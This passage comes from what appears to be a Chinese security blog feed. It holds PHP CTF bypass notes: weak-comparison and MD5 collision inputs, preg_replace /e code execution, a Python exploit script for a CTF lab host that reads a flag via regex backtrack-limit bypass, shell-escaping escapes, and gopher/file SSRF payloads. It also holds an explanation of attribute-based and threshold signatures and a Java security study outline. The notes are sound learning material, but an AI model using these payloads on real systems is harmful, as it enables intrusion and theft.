“==”我们称之为等值符，当等号两边为相同类型时，直接比较值是否相等；当等号两边类型不同时，先转换为相同的类型，再对转换后的值进行比较，如果比较一个数字和字符串或者涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照常数值进行比较。</span><br><span class=\"hljs-title function_ invoke__\">var_dump</span>(<span class=\"hljs-string\">\"admin\"</span>==<span class=\"hljs-number\">0</span>);  <span class=\"hljs-comment\">//true 即所有的纯字符串进行类型 转化后都变为了0</span><br><span class=\"hljs-title function_ invoke__\">var_dump</span>(<span class=\"hljs-string\">\"1admin\"</span>==<span class=\"hljs-number\">1</span>); <span class=\"hljs-comment\">//true</span><br><span class=\"hljs-title function_ invoke__\">var_dump</span>(<span class=\"hljs-string\">\"admin1\"</span>==<span class=\"hljs-number\">1</span>) <span class=\"hljs-comment\">//false</span><br><span class=\"hljs-title function_ invoke__\">var_dump</span>(<span class=\"hljs-string\">\"admin1\"</span>==<span class=\"hljs-number\">0</span>) <span class=\"hljs-comment\">//true</span><br><span class=\"hljs-comment\">// 转化后的结果只和开头部分相关，若开头部分不是数字，则默认转化为0</span><br><span class=\"hljs-title function_ invoke__\">var_dump</span>(<span class=\"hljs-string\">\"0e123456\"</span>==<span class=\"hljs-string\">\"0e4456789\"</span>); <span class=\"hljs-comment\">//true </span><br><span class=\"hljs-comment\">#该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0</span><br><br></code></pre></td></tr></tbody></table></figure>\n\n<p>以下是值不同，但是MD5相同的字符串，可以用于弱类型比较</p>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">byGcY<br><span class=\"hljs-number\">0e591948146966052067035298880982</span><br>sonZ7y<br><span class=\"hljs-number\">0e463306343746311593316642162425</span><br><br></code></pre></td></tr></tbody></table></figure>\n\n<p>也可以使用数组绕过a[]=123&amp;&amp;b[]=456</p>\n<p>计算得到的MD5进行若比较也相等</p>\n<p><strong>===</strong></p>\n<figure class=\"highlight crmsh\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs crmsh\">先比较类型相等再进行比较<br><span class=\"hljs-keyword\">op</span> === <span class=\"hljs-string\">\"2\"</span><br><br>由于是===必须是类型和数值都等于'<span class=\"hljs-number\">2</span>',所以可以让<span class=\"hljs-keyword\">op</span>等于数字<span class=\"hljs-number\">2</span>来绕<br></code></pre></td></tr></tbody></table></figure>\n\n<p>a[]=123&amp;&amp;b[]=456同样可以绕过强比较</p>\n<h3 id=\"强类型MD5绕过\"><a href=\"#强类型MD5绕过\" class=\"headerlink\" title=\"强类型MD5绕过\"></a>强类型MD5绕过</h3><figure class=\"highlight llvm\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs llvm\">a<span class=\"hljs-operator\">=</span><span class=\"hljs-variable\">%4</span>d<span class=\"hljs-variable\">%c9</span><span class=\"hljs-variable\">%68</span><span class=\"hljs-variable\">%ff</span><span class=\"hljs-variable\">%0</span>e<span class=\"hljs-variable\">%e3</span><span class=\"hljs-variable\">%5</span><span class=\"hljs-keyword\">c</span><span class=\"hljs-variable\">%20</span><span class=\"hljs-variable\">%95</span><span class=\"hljs-variable\">%72</span><span class=\"hljs-variable\">%d4</span><span class=\"hljs-variable\">%77</span><span class=\"hljs-variable\">%7</span>b<span class=\"hljs-variable\">%72</span><span class=\"hljs-variable\">%15</span><span class=\"hljs-variable\">%87</span><span class=\"hljs-variable\">%d3</span><span class=\"hljs-variable\">%6</span>f<span class=\"hljs-variable\">%a7</span><span class=\"hljs-variable\">%b2</span><span class=\"hljs-variable\">%1</span>b<span class=\"hljs-variable\">%dc</span><span class=\"hljs-variable\">%56</span><span class=\"hljs-variable\">%b7</span><span class=\"hljs-variable\">%4</span>a<span class=\"hljs-variable\">%3</span>d<span class=\"hljs-variable\">%c0</span><span class=\"hljs-variable\">%78</span><span class=\"hljs-variable\">%3</span>e<span class=\"hljs-variable\">%7</span>b<span class=\"hljs-variable\">%95</span><span class=\"hljs-variable\">%18</span><span class=\"hljs-variable\">%af</span><span class=\"hljs-variable\">%bf</span><span class=\"hljs-variable\">%a2</span><span class=\"hljs-variable\">%00</span><span class=\"hljs-variable\">%a8</span><span class=\"hljs-variable\">%28</span><span class=\"hljs-variable\">%4</span>b<span class=\"hljs-variable\">%f3</span><span class=\"hljs-variable\">%6</span>e<span class=\"hljs-variable\">%8</span>e<span class=\"hljs-variable\">%4</span>b<span class=\"hljs-variable\">%55</span><span class=\"hljs-variable\">%b3</span><span class=\"hljs-variable\">%5</span>f<span class=\"hljs-variable\">%42</span><span class=\"hljs-variable\">%75</span><span class=\"hljs-variable\">%93</span><span class=\"hljs-variable\">%d8</span><span class=\"hljs-variable\">%49</span><span class=\"hljs-variable\">%67</span><span class=\"hljs-variable\">%6</span>d<span class=\"hljs-variable\">%a0</span><span class=\"hljs-variable\">%d1</span><span class=\"hljs-variable\">%55</span><span class=\"hljs-variable\">%5</span>d<span class=\"hljs-variable\">%83</span><span class=\"hljs-variable\">%60</span><span class=\"hljs-variable\">%fb</span><span class=\"hljs-variable\">%5</span>f<span class=\"hljs-variable\">%07</span><span class=\"hljs-variable\">%fe</span><span class=\"hljs-variable\">%a2</span><br>b<span class=\"hljs-operator\">=</span><span class=\"hljs-variable\">%4</span>d<span class=\"hljs-variable\">%c9</span><span class=\"hljs-variable\">%68</span><span class=\"hljs-variable\">%ff</span><span class=\"hljs-variable\">%0</span>e<span class=\"hljs-variable\">%e3</span><span class=\"hljs-variable\">%5</span><span class=\"hljs-keyword\">c</span><span class=\"hljs-variable\">%20</span><span class=\"hljs-variable\">%95</span><span class=\"hljs-variable\">%72</span><span class=\"hljs-variable\">%d4</span><span class=\"hljs-variable\">%77</span><span class=\"hljs-variable\">%7</span>b<span class=\"hljs-variable\">%72</span><span class=\"hljs-variable\">%15</span><span class=\"hljs-variable\">%87</span><span class=\"hljs-variable\">%d3</span><span class=\"hljs-variable\">%6</span>f<span class=\"hljs-variable\">%a7</span><span class=\"hljs-variable\">%b2</span><span class=\"hljs-variable\">%1</span>b<span class=\"hljs-variable\">%dc</span><span class=\"hljs-variable\">%56</span><span class=\"hljs-variable\">%b7</span><span class=\"hljs-variable\">%4</span>a<span class=\"hljs-variable\">%3</span>d<span class=\"hljs-variable\">%c0</span><span class=\"hljs-variable\">%78</span><span class=\"hljs-variable\">%3</span>e<span class=\"hljs-variable\">%7</span>b<span class=\"hljs-variable\">%95</span><span class=\"hljs-variable\">%18</span><span class=\"hljs-variable\">%af</span><span class=\"hljs-variable\">%bf</span><span class=\"hljs-variable\">%a2</span><span class=\"hljs-variable\">%02</span><span class=\"hljs-variable\">%a8</span><span class=\"hljs-variable\">%28</span><span class=\"hljs-variable\">%4</span>b<span class=\"hljs-variable\">%f3</span><span class=\"hljs-variable\">%6</span>e<span class=\"hljs-variable\">%8</span>e<span class=\"hljs-variable\">%4</span>b<span class=\"hljs-variable\">%55</span><span class=\"hljs-variable\">%b3</span><span class=\"hljs-variable\">%5</span>f<span class=\"hljs-variable\">%42</span><span class=\"hljs-variable\">%75</span><span class=\"hljs-variable\">%93</span><span class=\"hljs-variable\">%d8</span><span class=\"hljs-variable\">%49</span><span class=\"hljs-variable\">%67</span><span class=\"hljs-variable\">%6</span>d<span class=\"hljs-variable\">%a0</span><span class=\"hljs-variable\">%d1</span><span class=\"hljs-variable\">%d5</span><span class=\"hljs-variable\">%5</span>d<span class=\"hljs-variable\">%83</span><span class=\"hljs-variable\">%60</span><span class=\"hljs-variable\">%fb</span><span class=\"hljs-variable\">%5</span>f<span class=\"hljs-variable\">%07</span><span class=\"hljs-variable\">%fe</span><span class=\"hljs-variable\">%a2</span><br><br>二者的MD<span class=\"hljs-number\">5</span>值是相同的<br><br></code></pre></td></tr></tbody></table></figure>\n\n\n\n\n\n<h2 id=\"preg-replace\"><a href=\"#preg-replace\" class=\"headerlink\" title=\"preg_replace\"></a>preg_replace</h2><hr>\n<figure class=\"highlight\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs\">使用数组传入，则正则表达式一定无法匹配到<br></code></pre></td></tr></tbody></table></figure>\n\n<p><strong>/e漏洞</strong></p>\n<figure class=\"highlight awk\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">preg_replace(<span class=\"hljs-string\">'/('</span>. <span class=\"hljs-variable\">$regex</span>.<span class=\"hljs-string\">')/ei'</span>,<span class=\"hljs-string\">'strtolower(\"\\1\")'</span>,<span class=\"hljs-variable\">$value</span>); <span class=\"hljs-comment\"># 该函数的作用是将在第三个参数中根据第一个参数进行匹配，将匹配到的字符串使用第二个字符串进行替换、</span><br>启用\\e模式后，则第二个参数会当做命令进行执行<br>https:<span class=\"hljs-regexp\">//</span>xz.aliyun.com<span class=\"hljs-regexp\">/t/</span><span class=\"hljs-number\">2557</span><br>\\S*=<span class=\"hljs-variable\">${getflag()}</span> 即可使getflag()被执行<br></code></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"单行匹配\"><a href=\"#单行匹配\" class=\"headerlink\" title=\"单行匹配\"></a>单行匹配</h3><p>如果传入的字符串中含有换行符，则会只匹配第一行看，可以使用%0A进行绕过</p>\n<h3 id=\"超长字符串绕过\"><a href=\"#超长字符串绕过\" class=\"headerlink\" title=\"超长字符串绕过\"></a>超长字符串绕过</h3><p>当输入的内容过长时 ，PHP为了防止出现DDOS攻击会限制正则表达式的回溯次数（默认回溯次数上限是一百万）</p>\n<p>因此可以在Payload后添加超长的字符串，导致匹配结果为false从而绕过</p>\n<p>例题：[FBCTF2019]RCEService</p>\n<figure class=\"highlight python\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> requests<br>payload = <span class=\"hljs-string\">'{\"cmd\":\"/bin/cat /home/rceservice/flag\",\"test\":\"'</span> + <span class=\"hljs-string\">\"a\"</span>*(<span class=\"hljs-number\">1000000</span>) + <span class=\"hljs-string\">'\"}'</span><br>res = requests.post(<span class=\"hljs-string\">\"http://434b3585-3396-4c38-8cd8-1a8425f7886a.node3.buuoj.cn/\"</span>, data={<span class=\"hljs-string\">\"cmd\"</span>:payload})<br><span class=\"hljs-built_in\">print</span>(res.text)<br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h2 id=\"escapeshellarg-escapeshellcmd\"><a href=\"#escapeshellarg-escapeshellcmd\" class=\"headerlink\" title=\"escapeshellarg()+escapeshellcmd()\"></a>escapeshellarg()+escapeshellcmd()</h2><hr>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">传入的参数是：172.17.0.2' -v -d a=1<br>经过escapeshellarg处理后变成了'172.17.0.2'\\'' -v -d a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。# 将单引号包裹成 '\\''<br>经过escapeshellcmd处理后变成'172.17.0.2'\\\\'' -v -d a=1\\'，这是因为escapeshellcmd对\\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php\t<br>最后执行的命令是curl '172.17.0.2'\\\\'' -v -d a=1\\'，由于中间的\\\\被解释为\\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\\ -v -d a=1'，即向172.17.0.2\\发起请求，POST 数据为a1'。<br><br>escapeshellcmd # 单纯的加上反斜杠转译<br></code></pre></td></tr></tbody></table></figure>\n\n<p>由于用户输入往往会被系统使用单引号括起来，则在payload中加入单引号，由于两个函数的连用，导致本来应该被转译的单引号出现逃逸</p>\n<p><a href=\"https://paper.seebug.org/164/\">https://paper.seebug.org/164/</a></p>\n<h2 id=\"rand\"><a href=\"#rand\" class=\"headerlink\" title=\"rand()\"></a>rand()</h2><hr>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-comment\"># mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数。</span><br><span class=\"hljs-comment\"># 使用工具php_mt_seed-4.0</span><br><br><br>使用脚本<br><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-variable\">$pass_now</span> = <span class=\"hljs-string\">\"FpCyLNvPOj\"</span>;<br><span class=\"hljs-variable\">$allowable_characters</span> = <span class=\"hljs-string\">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>;<br><br><span class=\"hljs-variable\">$length</span> = <span class=\"hljs-title function_ invoke__\">strlen</span>(<span class=\"hljs-variable\">$allowable_characters</span>) - <span class=\"hljs-number\">1</span>;<br><br><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-variable\">$j</span> = <span class=\"hljs-number\">0</span>; <span class=\"hljs-variable\">$j</span> &lt; <span class=\"hljs-title function_ invoke__\">strlen</span>(<span class=\"hljs-variable\">$pass_now</span>); <span class=\"hljs-variable\">$j</span>++) {<br>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-variable\">$i</span> = <span class=\"hljs-number\">0</span>; <span class=\"hljs-variable\">$i</span> &lt; <span class=\"hljs-variable\">$length</span>; <span class=\"hljs-variable\">$i</span>++) {<br>        <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$pass_now</span>[<span class=\"hljs-variable\">$j</span>] == <span class=\"hljs-variable\">$allowable_characters</span>[<span class=\"hljs-variable\">$i</span>]) {<br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$i</span> <span class=\"hljs-subst\">$i</span> 0 <span class=\"hljs-subst\">$length</span> \"</span>;<br>            <span class=\"hljs-keyword\">break</span>;<br>        }<br>    }<br>}<br><span class=\"hljs-meta\">?&gt;</span><br><br><span class=\"hljs-comment\"># ./php_mt_seed-4.0 41 41 0 61 15 15 0 61 38 38 0 61 24 24 0 61 47 47 0 61 49 49 0 61 21 21 0 61 51 51 0 61 50 50 0 61 9 9 0 61</span><br><span class=\"hljs-comment\"># 即可跑出对应的种子</span><br><br><br>\t<br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h2 id=\"curl-exec\"><a href=\"#curl-exec\" class=\"headerlink\" title=\"curl_exec\"></a>curl_exec</h2><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-comment\">##漏洞代码如下</span><br>\t\t\t<span class=\"hljs-variable\">$ch</span>=<span class=\"hljs-title function_ invoke__\">curl_init</span>(<span class=\"hljs-variable\">$url</span>);<br>            <span class=\"hljs-title function_ invoke__\">curl_setopt</span>(<span class=\"hljs-variable\">$ch</span>, CURLOPT_HEADER, <span class=\"hljs-number\">0</span>);<br>            <span class=\"hljs-title function_ invoke__\">curl_setopt</span>(<span class=\"hljs-variable\">$ch</span>, CURLOPT_RETURNTRANSFER, <span class=\"hljs-number\">1</span>);<br>            <span class=\"hljs-variable\">$result</span>=<span class=\"hljs-title function_ invoke__\">curl_exec</span>(<span class=\"hljs-variable\">$ch</span>);<br>            <span class=\"hljs-title function_ invoke__\">curl_close</span>(<span class=\"hljs-variable\">$ch</span>);<br>            <span class=\"hljs-keyword\">echo</span> (<span class=\"hljs-variable\">$result</span>);<br><br><span class=\"hljs-comment\">## 利用方式</span><br>传入的url可以使用file协议进行文件的读取<br>传入gopher协议可以进行ssrf，将请求的get或者post数据包进行url编码进行传递<br><br>url=gopher:<span class=\"hljs-comment\">//127.0.0.1:80/_[Payload]</span><br>Payload 中的%<span class=\"hljs-number\">0</span>a要使用%<span class=\"hljs-number\">0</span>d%<span class=\"hljs-number\">0</span>a进行传递    <br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h2 id=\"PHP格式化字符串漏洞\"><a href=\"#PHP格式化字符串漏洞\" class=\"headerlink\" title=\"PHP格式化字符串漏洞\"></a>PHP格式化字符串漏洞</h2><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-comment\">##%1$s  ——  这种办法原理是%1$s会将第一个参数用string类型输出，而这道题中第一个参数便是admin.php的源码，语句是：</span><br><span class=\"hljs-keyword\">print</span>(<span class=\"hljs-title function_ invoke__\">sprintf</span>(<span class=\"hljs-string\">\"<span class=\"hljs-subst\">$url</span> method&amp;content_size:\"</span>GET%<span class=\"hljs-number\">1</span><span class=\"hljs-variable\">$s</span>%d<span class=\"hljs-string\">\", <span class=\"hljs-subst\">$detect</span>));  ## %1<span class=\"hljs-subst\">$s</span>会以字符串格式输出<span class=\"hljs-subst\">$detect</span>，而%d会输出0</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">##  %s%  ——  这种办法的原理是sprintf()函数中%可以转义掉%，这样语句就变成了</span><br><span class=\"hljs-string\">print(sprintf(\"</span><span class=\"hljs-variable\">$url</span> method&amp;<span class=\"hljs-attr\">content_size</span>:<span class=\"hljs-string\">\"GET%s%%d\"</span>, <span class=\"hljs-variable\">$detect</span>));  <span class=\"hljs-comment\">// %d前的%被转义，因此失</span><br></code></pre></td></tr></tbody></table></figure>\n\n",
            "tags": []
        },
        {
            "id": "https://alazymechnaic.github.io/2024/03/04/shu-xing-qian-ming-yu-men-xian/",
            "url": "https://alazymechnaic.github.io/2024/03/04/shu-xing-qian-ming-yu-men-xian/",
            "title": "属性签名与门限",
            "date_published": "2024-03-04T06:10:57.000Z",
            "content_html": "<h2 id=\"属性签名（attribute-based-signature）\"><a href=\"#属性签名（attribute-based-signature）\" class=\"headerlink\" title=\"属性签名（attribute-based signature）\"></a>属性签名（attribute-based signature）</h2><h3 id=\"属性签名概念\"><a href=\"#属性签名概念\" class=\"headerlink\" title=\"属性签名概念\"></a>属性签名概念</h3><p>​\t用于对数据进行签名并控制签名的访问权限。与传统的数字签名不同，基于属性的签名允许签名者为签名设置一组属性，并且只有满足特定属性集合的用户能够验证和解析签名。每个用户和签名都关联了一组属性，这一组属性在进行签名时被指定，只有满足相应属性的用户才能解析和验证。（也就是说用户需要提供具备相关属性的证明）</p>\n<h3 id=\"秘钥\"><a href=\"#秘钥\" class=\"headerlink\" title=\"秘钥\"></a>秘钥</h3><ul>\n<li>签名者的私钥包括一个<strong>主私钥（Master Private Key）</strong>和一组属性私钥<strong>（Attribute Private Keys）</strong>。</li>\n<li>验证者的公钥是根据属性生成的</li>\n</ul>\n<p>其实就是机构认定你属于某个范畴内，给你颁发了一个证书，你手里有个私钥，你以后做相应的签名，都可以进行证明你属于这个范畴。而别人有了你的私钥也不能证明其属于这个范畴。也就是没有办法合谋。</p>\n<h2 id=\"门限（Threshold）\"><a href=\"#门限（Threshold）\" class=\"headerlink\" title=\"门限（Threshold）\"></a>门限（Threshold）</h2><h3 id=\"门限概念\"><a href=\"#门限概念\" class=\"headerlink\" title=\"门限概念\"></a>门限概念</h3><p>在多方参与的协议或者方案中，需要达到的最小参与方数量或阈值，以便进行某些操作或达成共识。目的是只有到达一定的参与方之后，才能做某些决策等，确保多方之间的共识和安全性。</p>\n<h3 id=\"门限签名（Threshold-Signature\"><a href=\"#门限签名（Threshold-Signature\" class=\"headerlink\" title=\"门限签名（Threshold Signature)\"></a>门限签名（Threshold Signature)</h3><p>​\t参与方共同生成和签署一份签名，但需要达到预定的门限值才能生成有效的签名。这意味着不足门限值的参与方无法单独生成有效签名，确保了多方之间的共同控制和安全性。</p>\n<h3 id=\"门限加密（Threshold-Encryption\"><a href=\"#门限加密（Threshold-Encryption\" class=\"headerlink\" title=\"门限加密（Threshold Encryption)\"></a>门限加密（Threshold Encryption)</h3><p>​\t密钥被分割成多个部分，并且需要达到门限值才能还原出有效的密钥。这样，密钥的保管和使用需要多个参与方的协作，增强了密钥的安全性。</p>\n<h3 id=\"门限秘钥共享（Threshold-Key-Sharing\"><a href=\"#门限秘钥共享（Threshold-Key-Sharing\" class=\"headerlink\" title=\"门限秘钥共享（Threshold Key Sharing)\"></a>门限秘钥共享（Threshold Key Sharing)</h3><p>​\t一个密钥被分割成多个部分，并分配给多个参与方。只有当达到门限值的参与方合作时，才能重构出完整的密钥，确保了密钥的安全性和可用性。</p>\n<p>我们可以设计基于属性签名的方案来解决社交平台用户身份验证和保护隐私的问题。下面是基本的思路：</p>\n<ol>\n<li><p>属性密钥生成机构(AKG)去中心化：可以通过区块链技术来实现这个特性。这样子，不同的机构可以注册为AKG，并接入该系统。每一家机构都可以生成并处理自己的私钥，而无需担心系统的中心化问题。在用户注册或验证他们的属性（如学校、工作机构等）时，相关的机构就会为用户生成和颁发私钥。</p>\n</li>\n<li><p>阻止具有不同属性的用户的合谋：属性签名可以通过一种机制来实现，即不同的属性对应不同的密钥。任何一个用户都只能拥有它相应属性的密钥。如果用户尝试将他们的密钥结合在一起，由于签名算法的特性，这将导致签名无效。</p>\n</li>\n<li><p>高效、稳定运行：首先我们需要选择一种效率较高的属性签名算法。然后，针对该算法进行优化以适应大规模用户使用。我们还需要进行严格的性能和压力测试，以确保问题的可扩展性和稳定性。另外，使用高效的数据库和服务器资源也能够确保系统的高效运行。</p>\n</li>\n</ol>\n<p>这种解决方案也尊重用户的隐私，因为用户可以选择自己想要共享哪些属性，并且证明自己拥有这些属性而无需公开任何其他可能泄露隐私的信息。例如，用户可以证明他们在某所学校工作或学习，但无需公开他们的名字或其他详细信息，大大提高了身份验证的灵活性和便利性。同时，每个用户的密钥都是去中心化生成的，无法由单一机构控制，从而进一步加强了安全性。</p>\n<h3 id=\"假设在基于属性的方案中，用户A获得了对学校S1的属性秘钥X，用户B获得了对于学校S2的属性秘钥Y，那么A和B合谋交换了自己的秘钥后，A是否就能冒用S2学校的属性？\"><a href=\"#假设在基于属性的方案中，用户A获得了对学校S1的属性秘钥X，用户B获得了对于学校S2的属性秘钥Y，那么A和B合谋交换了自己的秘钥后，A是否就能冒用S2学校的属性？\" class=\"headerlink\" title=\"假设在基于属性的方案中，用户A获得了对学校S1的属性秘钥X，用户B获得了对于学校S2的属性秘钥Y，那么A和B合谋交换了自己的秘钥后，A是否就能冒用S2学校的属性？\"></a>假设在基于属性的方案中，用户A获得了对学校S1的属性秘钥X，用户B获得了对于学校S2的属性秘钥Y，那么A和B合谋交换了自己的秘钥后，A是否就能冒用S2学校的属性？</h3><figure class=\"highlight css\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\">基于属性签名的系统旨在对每个用户(UI)和每个属性(AI)独立地产生秘钥，而一个秘钥主要由两部分组成：用户ID部分和属性信息部分。如果两个用户交换了秘钥，他们将不能成功冒用对方的属性，原因主要有两点： <br><br><span class=\"hljs-number\">1</span>. **用户标识的唯一性**：签名核验的过程将会校验签名者的ID是否匹配签名，即使用户<span class=\"hljs-selector-tag\">A</span>得到了<span class=\"hljs-selector-tag\">B</span>的秘钥并试图签名，由于签名核验过程中ID的检查，<span class=\"hljs-selector-tag\">A</span>将无法成功模仿<span class=\"hljs-selector-tag\">B</span>的属性。<br><br><span class=\"hljs-number\">2</span>. **秘钥与属性对应**：属性秘钥的生成过程中，特定的属性信息也被编码进秘钥中。因此，即使两个用户交换了秘钥，由于秘钥是为对应的特定属性生成的，他们也无法用这个秘钥签署不符合这个属性的信息。<br><br>因此，基于属性的加密和签名方案本质上可以防止秘钥交换后的冒名行为。然而，仍建议在设计系统时，慎重处理秘钥管理和配发的过程，防止秘钥被滥用。<br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<p>也就是要基于区块链实现一个能够多机构颁发属性签名的身份认证系统。</p>\n<p>分布式身份</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/341995836\">https://zhuanlan.zhihu.com/p/341995836</a></p>\n<p>区块链与属性签名</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/640139780\">https://zhuanlan.zhihu.com/p/640139780</a></p>\n<p>门限签名技术</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/558143725\">https://zhuanlan.zhihu.com/p/558143725</a></p>\n<p>门限签名的概念与应用</p>\n<p><a href=\"https://www.bitalk.com/news/detail/758849051348307968\">https://www.bitalk.com/news/detail/758849051348307968</a></p>\n",
            "tags": []
        },
        {
            "id": "https://alazymechnaic.github.io/2024/02/29/java-an-quan-shen-ji/",
            "url": "https://alazymechnaic.github.io/2024/02/29/java-an-quan-shen-ji/",
            "title": "JAVA安全审计",
            "date_published": "2024-02-29T13:21:04.000Z",
            "content_html": "<h2 id=\"环境配置\"><a href=\"#环境配置\" class=\"headerlink\" title=\"环境配置\"></a>环境配置</h2><h3 id=\"IDEA\"><a href=\"#IDEA\" class=\"headerlink\" title=\"IDEA\"></a>IDEA</h3><h3 id=\"Maven\"><a href=\"#Maven\" class=\"headerlink\" title=\"Maven\"></a>Maven</h3><h3 id=\"JavaWeb\"><a href=\"#JavaWeb\" class=\"headerlink\" title=\"JavaWeb\"></a>JavaWeb</h3><h4 id=\"Serverlet基础\"><a href=\"#Serverlet基础\" class=\"headerlink\" title=\"Serverlet基础\"></a>Serverlet基础</h4><h3 id=\"反射机制\"><a href=\"#反射机制\" class=\"headerlink\" title=\"反射机制\"></a>反射机制</h3><ul>\n<li>反射修改字段</li>\n<li>反射修改final的问题</li>\n<li>反射调试方法</li>\n<li>高版本绕过反射限制</li>\n</ul>\n<h4 id=\"ASM-x2F-javassist\"><a href=\"#ASM-x2F-javassist\" class=\"headerlink\" title=\"ASM/javassist\"></a>ASM/javassist</h4><ul>\n<li>java字节码（用到再学）</li>\n<li>如何使用ASM修改字节码</li>\n<li>如何使用javaassist生成字节码</li>\n</ul>\n<h3 id=\"JNDI攻击\"><a href=\"#JNDI攻击\" class=\"headerlink\" title=\"JNDI攻击\"></a>JNDI攻击</h3><ul>\n<li>log4j2</li>\n<li>8u191下如何攻击</li>\n<li>8u191以上如何打（反序列化/本地工厂）</li>\n<li>漏洞如何审计：lookup</li>\n</ul>\n<h3 id=\"RMI攻击\"><a href=\"#RMI攻击\" class=\"headerlink\" title=\"RMI攻击\"></a>RMI攻击</h3><h3 id=\"Java-Agent\"><a href=\"#Java-Agent\" class=\"headerlink\" title=\"Java Agent\"></a>Java Agent</h3><ul>\n<li>启动前与运行中Agent，如何attach java agent</li>\n<li>RASP的原理，简单实现</li>\n</ul>\n<h3 id=\"JMX-x2F-JDWP\"><a href=\"#JMX-x2F-JDWP\" class=\"headerlink\" title=\"JMX/JDWP\"></a>JMX/JDWP</h3><ul>\n<li>一个监控，一个调试</li>\n</ul>\n<h3 id=\"反序列化基础\"><a href=\"#反序列化基础\" class=\"headerlink\" title=\"反序列化基础\"></a>反序列化基础</h3><ul>\n<li>反序列化链：URLDNS/CC/CB/7u21/8u20分析</li>\n<li>尝试阅读并魔改ysoserial</li>\n<li>JEP 290是什么</li>\n<li>JEP 290鸡肋绕过</li>\n</ul>\n<h3 id=\"FastJson反序列化\"><a href=\"#FastJson反序列化\" class=\"headerlink\" title=\"FastJson反序列化\"></a>FastJson反序列化</h3><ul>\n<li>1.2.47以前的分析和绕过</li>\n<li>1.2.47 到 1.2.68的分析和绕过</li>\n<li>1.2.80的分析</li>\n<li>出网与不出网的利用</li>\n</ul>\n<h3 id=\"weblogic\"><a href=\"#weblogic\" 